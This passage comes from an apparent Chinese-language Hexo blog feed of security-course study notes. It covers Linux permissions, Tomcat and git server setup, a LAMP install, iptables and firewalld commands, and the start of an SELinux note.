id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>[引用]</p><blockquote><p>引用</p></blockquote><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>[TOC]</p>]]></content>
      
      
      <categories>
          
          <category> markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week2sum</title>
      <link href="/2019/07/29/week2sum/"/>
      <url>/2019/07/29/week2sum/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p><a id="more"></a><!--export--><h2 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h2><h3 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h3><h3 id="1-内容简介"><a href="#1-内容简介" class="headerlink" title="1.内容简介"></a>1.内容简介</h3><ul><li><p>Linux权限控制</p></li><li><p>git服务器搭建与安全检查</p></li><li><p>tomcat服务器搭建与安全检查</p></li></ul><h4 id="2-几种文件类型"><a href="#2-几种文件类型" class="headerlink" title="2.几种文件类型"></a>2.几种文件类型</h4><ul><li><p>[d] 是目录</p></li><li><p>[-] 是文件</p></li><li><p>[l] 是链接文件(link file)</p></li></ul><h4 id="3-读写执行权限"><a href="#3-读写执行权限" class="headerlink" title="3.读写执行权限"></a>3.读写执行权限</h4><table><thead><tr><th align="center">文件类型</th><th align="center">属主权限</th><th align="center">属组权限</th><th align="center">其他用户权限</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">123</td><td align="center">456</td><td align="center">789</td></tr><tr><td align="center">d</td><td align="center">rwx</td><td align="center">r-x</td><td align="center">r-x</td></tr><tr><td align="center">目录文件</td><td align="center">读写执行</td><td align="center">读—执行</td><td align="center">读—执行</td></tr></tbody></table><p>对于目录的rwx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* r可以显示文件夹的结构</span><br><span class="line">* w可以在文件夹里添加删除文件</span><br><span class="line">* x可以进入到文件夹</span><br></pre></td></tr></table></figure><h5 id="权限命令："><a href="#权限命令：" class="headerlink" title="权限命令："></a>权限命令：</h5><p>rwx在系统中对应一个个的值，r-4，w-2，x-1</p><p>chown修改当前文件或文件夹的所属用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root:root /tmp/tmp1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R root:root /tmp/tmp1</span><br></pre></td></tr></table></figure><p>chmod修改当前文件或文件夹的权限</p><p>语法：chmod [who] [+|-|=] [mode] 文件名</p><p>操作对象who：</p><ul><li>u表示“用户(user)”，即文件或目录的所有者</li><li>g表示”同组(group)用户”，即与文件属主有相同组ID的所有用户</li><li>o表示”其他(other)用户”</li><li>a表示”所有(all)用户”，它是系统默认值</li></ul><p>推荐使用数字的方式修改文件或者文件夹的权限</p><p>操作符可以是：</p><ul><li><p>+添加某个权限</p></li><li><p>-取消某个权限</p></li><li><p>=赋予给定权限并取消其他所有权限</p><p>*不指定用户的情况下，=只会给文件所有者加权限，+给所有者加权限</p></li></ul><p><strong>一个网站最合理的权限是755</strong></p><h4 id="4-渗透测试中常用的命令"><a href="#4-渗透测试中常用的命令" class="headerlink" title="4.渗透测试中常用的命令"></a>4.渗透测试中常用的命令</h4><ul><li><p>whoami 查看当前用户</p></li><li><p>tar 压缩和解压文件</p></li><li><p>netstat 查看网络状态</p></li><li><p>nslookup 查看dns信息</p></li><li><p>ps 查看运行的程序</p></li><li><p>top 实时查看运行的程序</p></li><li><p>service 使用service控制服务启动关闭</p></li><li><p>curl 获取网页，可以使用输出重定向来下载文件</p></li><li><p>wget 下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>sources.list是各种软件源，常用的源有阿里云、清华大学、中科院</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p><strong>Note</strong>: 推荐关机快照</p></li></ul><h2 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h2><h3 id="tomcat和git服务器搭建"><a href="#tomcat和git服务器搭建" class="headerlink" title="tomcat和git服务器搭建"></a>tomcat和git服务器搭建</h3><h4 id="1-内容简介-1"><a href="#1-内容简介-1" class="headerlink" title="1.内容简介"></a>1.内容简介</h4><ul><li><p>复习</p></li><li><p>tomcat服务器搭建</p></li></ul><h4 id="2-网络不通该如何调试"><a href="#2-网络不通该如何调试" class="headerlink" title="2.网络不通该如何调试"></a>2.网络不通该如何调试</h4><p>先用ficonfig查看网卡信息，若正常，ping 网卡，若不正常，查看配置文件和网络环境；若网卡默认不启用，修改配置文件，onboot=yes 重启网络服务，配置文件路径：/etc/sysconfig/network-scripts/ifcfg-eth0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sysconfig/network-script/ifcfg-eth0</span><br><span class="line">vi /etc/sysconfig/network-script/ifcfg-eth0</span><br><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>若网络环境是dhcp，修改上网方式为dhcp，重启网络服务</p><p>若网络环境是静态ip，修改上网方式为static，ipaddr=, netmask=, gateway=</p><p>能够ping通8.8.8.8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br></pre></td></tr></table></figure><p>若不能打开，查看dns配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/resolv.conf</span><br></pre></td></tr></table></figure><p>添加servername 1.1.1.1</p><h4 id="3-搭建tomcat服务器"><a href="#3-搭建tomcat服务器" class="headerlink" title="3.搭建tomcat服务器"></a>3.搭建tomcat服务器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动防火墙</span></span><br><span class="line">systemctl start firewalld</span><br><span class="line"><span class="comment">#将80端口添加到防火墙例外并重启</span></span><br><span class="line">firewall-cmd --zone=public --add-por=8080/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>防火墙=硬件+软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum apt-get -y install tomcat</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi .../apache-tomcat-8.5.43/webapps/manager/META-INF/context.xml</span><br></pre></td></tr></table></figure><p>修改tomcat配置文件为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">antiResourceLocking</span>=<span class="string">"false"</span> <span class="attr">privileged</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.RemoteAddrValve"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">allow</span>=<span class="string">"\d+\.\d+\.\d+\.\d+"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><p>进入conf目录下修改tomcat-users.xml 用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-usersversion="1.0"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://tomcat.apache.org/xml tomcat-users.xsd"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www/w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlnx</span>=<span class="string">"http://tomcat.apache.org/xml"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-gui"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-script"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-jmx"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-status"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin-gui"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin-script"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-gui"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span> <span class="attr">roles</span>=<span class="string">"manager-gui, manager-script, manager-jmx, manager-status, admin-script"</span> <span class="attr">password</span>=<span class="string">"tomcat"</span> <span class="attr">username</span>=<span class="string">"tomcat"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-git服务器搭建"><a href="#4-git服务器搭建" class="headerlink" title="4.git服务器搭建"></a>4.git服务器搭建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改yum源</span></span><br><span class="line">cat CentOS-Base.repo</span><br><span class="line"><span class="comment">#[base]注释掉mirrorlist和baseurl添加以下语句</span></span><br><span class="line">baseurl=http://192.168.100.110:8000/yum/</span><br><span class="line"><span class="comment">#以下三个修改为enable=0</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载git</span></span><br><span class="line">[root@localhost]$ yum install git</span><br><span class="line"><span class="comment">#添加git用户</span></span><br><span class="line">[root@localhost]$ useradd git</span><br><span class="line">[root@localhost]$ <span class="built_in">cd</span> /home/git/</span><br><span class="line">[root@localhost]$ ll</span><br><span class="line">total 0</span><br><span class="line">[root@localhost]$ <span class="built_in">pwd</span></span><br><span class="line">/home/git</span><br><span class="line">[root@localhost]$ <span class="built_in">cd</span> ..</span><br><span class="line">[root@localhost]$ su git</span><br><span class="line">[git@localhost]$ mkdir .ssh</span><br><span class="line">[git@localhost]$ <span class="built_in">cd</span> .ssh/</span><br><span class="line">[git@localhost]$ touch authorized_keys</span><br><span class="line">[git@localhost]$ chmod 600 authorized_keys</span><br><span class="line">[git@localhost]$ <span class="built_in">cd</span> /</span><br><span class="line">[git@localhost~]$ mkdir Project</span><br><span class="line">[git@localhost~]$ <span class="built_in">cd</span> Project</span><br><span class="line">[git@localhost Project]$ git init --bare icq.git</span><br></pre></td></tr></table></figure><p>win10启动powershell dir ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>产生两个文件.pub是公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir .ssh</span><br><span class="line"><span class="built_in">type</span> .\.ssh\id_rsa.pub</span><br><span class="line"><span class="comment">#获得公钥</span></span><br></pre></td></tr></table></figure><p>粘贴到git用户authorized_keys</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 .ssh</span><br><span class="line">chmod 600 authorized_keys</span><br></pre></td></tr></table></figure><ul><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure></li><li><p>再创建用户git //管理git中所有的项目</p></li><li><p>在git用户家目录，创建.ssh文件夹，修改权限为700 //这个是因为ssh服务限制</p></li><li><p>在.ssh文件夹下创建authorized_keys文件 ，修改权限为600 //这个因为ssh服务的限制，权限不正确认证会失败</p></li><li><p>在git用户家目录创建project目录，用来存放git项目</p></li><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始化一个git项目</span></span><br><span class="line">git init --bare icq.git</span><br></pre></td></tr></table></figure></li></ul><p>git客户端</p><ul><li><p>安装git    // git for windows   git for linux</p></li><li><p>windows 10 使用ssh创建公钥和私钥</p></li><li><p>ssh-keygen -t rsa 就会在家目录创建.ssh文件夹，里面就会有两个文件，将公钥(.pub结尾)写入到服务器authorized_keys文件中</p></li><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@ip:/home/git/project/icq.git</span><br></pre></td></tr></table></figure></li></ul><p><strong>Note</strong>:默认情况下 ssh <a href="mailto:git@192.168.100.167" target="_blank" rel="noopener">git@192.168.100.167</a>可以登录虚拟机，从而产生安全问题，在虚拟机里切换到root权限修改git的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~] usermod -s /sbin/nologin git</span><br></pre></td></tr></table></figure><p>这样ssh就禁止了</p><h4 id="5-搭建博客"><a href="#5-搭建博客" class="headerlink" title="5.搭建博客"></a>5.搭建博客</h4><ol><li><p>安装Github桌面版和Node.js</p></li><li><p>然后cmd中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli --registry=https://registry.nom.taobao.org</span><br></pre></td></tr></table></figure><ol start="3"><li>创建一个blog目录，用来存放博客</li><li>进入到blog中，启动cmd执行命令</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始化hexo</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment">#生成博客</span></span><br><span class="line">hexo g</span><br><span class="line"><span class="comment">#搭建服务</span></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><ol start="5"><li>然后浏览器访问<a href="localhost:4000" target="_blank" rel="noopener">播客主页</a></li></ol></li></ol><p>安装CentOs Mini，安装好后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum groupinstall <span class="string">"development tools"</span></span><br></pre></td></tr></table></figure><h2 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h2><h3 id="Linux下应用的安装"><a href="#Linux下应用的安装" class="headerlink" title="Linux下应用的安装"></a>Linux下应用的安装</h3><h4 id="1-CentOS系统中有三种安装软件的方法"><a href="#1-CentOS系统中有三种安装软件的方法" class="headerlink" title="1.CentOS系统中有三种安装软件的方法"></a>1.CentOS系统中有三种安装软件的方法</h4><ul><li>通过源码安装<ul><li>./configure</li></ul></li><li>make &amp;&amp; make install</li><li>通过rpm安装<ul><li>rpm -ivh …</li></ul></li><li>通过yum安装<ul><li>yum search …</li></ul></li><li>yum install …</li></ul><p>rpm类型文件安装的时候，会先去读取文件内记载的设置参数内容，然后将该数据用来比对linux系统的环境，以找到是否有属性相依的软件尚未安装的问题。RPM使用自动化安装软件，比较类似windows下的.exe需要下载的安装包，但是它安装过程中会有很多依赖问题。</p><ul><li><p>-q: 仅查询，后面接软件名称是否有安装</p></li><li><p>-qa: 列出所有，已经安装在本机linux系统上面的所有软件名称</p></li><li><p>-ql: 列出该软件所有的文件与目录所在完整文件名(list)</p></li><li><p>-qR: 列出与该软件有关的相依软件所在的文件(requried)</p></li></ul><p>源码安装：先阅读README文件，找到安装方法，安装相依赖的库，最后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h2 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h2><h3 id="搭建apache-php-mysql和iptables-firewall"><a href="#搭建apache-php-mysql和iptables-firewall" class="headerlink" title="搭建apache+php+mysql和iptables+firewall"></a>搭建apache+php+mysql和iptables+firewall</h3><h4 id="1-昨天回顾"><a href="#1-昨天回顾" class="headerlink" title="1.昨天回顾"></a>1.昨天回顾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install</span><br><span class="line">rpm -ivh a.rpm/http/ftp:baidu.com/a.tpm nginx.tar.gz</span><br><span class="line">tar cat readme install</span><br><span class="line">./configure --<span class="built_in">help</span> --prefix=安装路径 --with-apr=指定依赖位置</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h4 id="2-搭建apache-php-mysql环境-要求使用php5-6"><a href="#2-搭建apache-php-mysql环境-要求使用php5-6" class="headerlink" title="2.搭建apache+php+mysql环境(要求使用php5.6)"></a>2.搭建apache+php+mysql环境(要求使用php5.6)</h4><ul><li><p>安装httpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装httpd</span></span><br><span class="line">yum install httpd httpd-devel httpd-manual mod_ssl -y</span><br><span class="line"><span class="comment">#启动apache</span></span><br><span class="line">systemctl start httpd</span><br><span class="line"><span class="comment">#设置apache开机启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br><span class="line"><span class="comment">#查看开放端口，检查有没有httpd服务，80和443端口是否开放</span></span><br><span class="line">ss -antlp</span><br></pre></td></tr></table></figure></li><li><p>配置防火墙，可以正常访问apache</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=433/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li><li><p>安装php5.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm</span><br><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line"><span class="comment">#卸载系统中原有的php</span></span><br><span class="line">yum remove php-common -y</span><br><span class="line"><span class="comment">#安装php5.6和php扩展</span></span><br><span class="line">yum install -y php56w php56w-opcache php56w-xml php56w-mcrypt php56w-gd php56w-mysql php56w-intl php56w-mbstring</span><br><span class="line"><span class="comment">#进入网站根目录</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="comment">#在网站根目录中创建index.php，写入phpinfo函数，测试网站php是否正常</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> &gt; index.php</span><br></pre></td></tr></table></figure></li><li><p>安装mariadb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server -y</span><br><span class="line"><span class="comment">#启动mariadb-server</span></span><br><span class="line">systemctl start mariadb</span><br><span class="line"><span class="comment">#设置mariadb-server开机自启</span></span><br><span class="line">systemctl enablemariadb</span><br><span class="line"><span class="comment">#初始化mysql，注意记住mysql密码</span></span><br><span class="line">mysql_secure_installation</span><br><span class="line"><span class="comment">#关机+快照</span></span><br><span class="line">poweroff</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-关于网站搭建："><a href="#3-关于网站搭建：" class="headerlink" title="3.关于网站搭建："></a>3.关于网站搭建：</h4><p>需要将网站的源代码使用工具复制到虚拟机中的网站根目录下(phpmyadmin除外)，修改网站的所有者为apache</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R apache:apache /var/www/html</span><br></pre></td></tr></table></figure><p>wordpress特性：</p><p>​    移动网站后，网站的样式将出错，所以wordpress在安装成功后，不能移动</p><p>​    虚拟机ip改变后，wordpress打开会卡页面，需要去数据库中修改ip</p><p>wp_options表中</p><p>​    siteurl: http://新ip</p><p>​    home: http://新ip</p><p>搭建没有提供安装引导的网站：</p><p>​    上传网站源代码到网站根目录，找到网站的配置文件，一般是config.php</p><p>​    再找到网站提供的sql文件，使用phpmyadmin之类工具，导入数据或直接使用mysql -uroot -p 登录数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database database_name</span><br><span class="line">use database_name</span><br><span class="line"><span class="built_in">source</span> absolute_path/name.sql</span><br></pre></td></tr></table></figure><p>向数据库中导入内容，有多重方式，可以自行测试</p><h2 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h2><h3 id="Linux安全检查"><a href="#Linux安全检查" class="headerlink" title="Linux安全检查"></a>Linux安全检查</h3><h4 id="1-防火墙功能："><a href="#1-防火墙功能：" class="headerlink" title="1.防火墙功能："></a>1.防火墙功能：</h4><p>​    filter功能是防火墙一个重要功能，它定义数据通过是允许或者不允许</p><p>​    filter控制数据类型分为两类：INPUT和OUTPUT</p><h4 id="2-Iptables命令讲解："><a href="#2-Iptables命令讲解：" class="headerlink" title="2.Iptables命令讲解："></a>2.Iptables命令讲解：</h4><p>-A 追加</p><p>-p 指定协议类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* tcp通过dport指定目标端口，sport指定源端口</span><br><span class="line">* udp通tcp</span><br><span class="line">* icmp通过--icmp-type指定类型，0是响应类型的数据包，8是请求类型的包</span><br></pre></td></tr></table></figure><p>-m 表示启动扩展功能</p><p>​    一般和-p配合，-p指定类型后，通过-m打开此类型的扩展功能</p><p>-j 指定如何进行处理DROP，REJECT，ACCEPT/丢弃，拒绝，通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT/OUTPUT -j DROP/REJECT/ACCEPT</span><br></pre></td></tr></table></figure><p>编辑iptables的配置文件：</p><p>​    通过编辑文件可以直接修改iptables规则，编辑文件，写入指定规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -j ACCEPT</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class="line">-A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看现有规则</span></span><br><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加80端口通过的规则</span></span><br><span class="line">firewallc-cmd --zone=public --add-port=80/tcp --permanent</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center"></th><th align="center"><strong>drop</strong></th><th align="center"><strong>默认丢弃所有包</strong></th></tr></thead><tbody><tr><td align="center"><strong>–zone</strong></td><td align="center"><strong>block</strong></td><td align="center"><strong>拒绝所有外部连接，允许内部发起连接</strong></td></tr><tr><td align="center"></td><td align="center"><strong>public</strong></td><td align="center"><strong>指定外部连接可以进入</strong></td></tr></tbody></table><p>–add-port           指定添加端口     80/tcp     53/udp</p><p>–add-service      指定常见服务      http    https    mysql     mssql      ssh</p><p>–permanent     永久生效</p><p>删除80端口通过的规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent</span><br></pre></td></tr></table></figure><p>–remove-port           指定删除端口</p><p>–remove-service      指定删除服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#防火墙更新规则</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="comment">#防火墙显示所有规则</span></span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"><span class="comment">#查看防火墙状态</span></span><br><span class="line">systemctl status firewalld</span><br><span class="line"><span class="comment">#启动防火墙</span></span><br><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure><p>临时加立即生效，–reload后失效，–pernament必须，–reload后才失效 </p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note11</title>
      <link href="/2019/07/29/noteday11/"/>
      <url>/2019/07/29/noteday11/</url>
      
        <content type="html"><![CDATA[<!-- excerpt --><!--toc--><h2 id="1-SELINUX"><a href="#1-SELINUX" class="headerlink" title="1. SELINUX"></a>1. SELINUX</h2><p>即Security-Enhanced Linux，是一个Linux内核模块，也是Linux的一个安全子系统。SELinux作用是<strong>最大限度地减少系统中服务进程可访问的资源</strong>（最小权限原则）。</p><p>如果一个以root身份运行的网络服务存在0day漏洞，黑客就可以利用这个漏洞，以root的身份在您的服务器上为所欲为。SELinux就是解决这个问题。</p><table><thead><tr><th align="center">系统</th><th align="center">资源能否被访问因素</th></tr></thead><tbody><tr><td align="center">无SELinux</td><td align="center">某资源是否拥有对应用户的权限（读写执行）</td></tr><tr><td align="center">SELinux</td><td align="center">还需要判断每一类进程是否拥有对某一类资源的访问权限</td></tr></tbody></table><p><strong>SELinux的工作模式</strong></p><table><thead><tr><th align="center">模式名称</th><th align="center">工作模式</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">enforcing</td><td align="center">强制模式</td><td align="center">违反SELinux规则的行为将组织并记录到日志中</td></tr><tr><td align="center">permissive</td><td align="center">宽容模式</td><td align="center">违反SELinux规则的行为只会记录到日志中，调试用</td></tr><tr><td align="center">disabled</td><td align="center">关闭模式</td><td align="center">关闭SELinux</td></tr></tbody></table><p>SELinux工作模式可以在<code>/etc/selinux/config</code>中设定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改SELinux模式</span></span><br><span class="line">vi 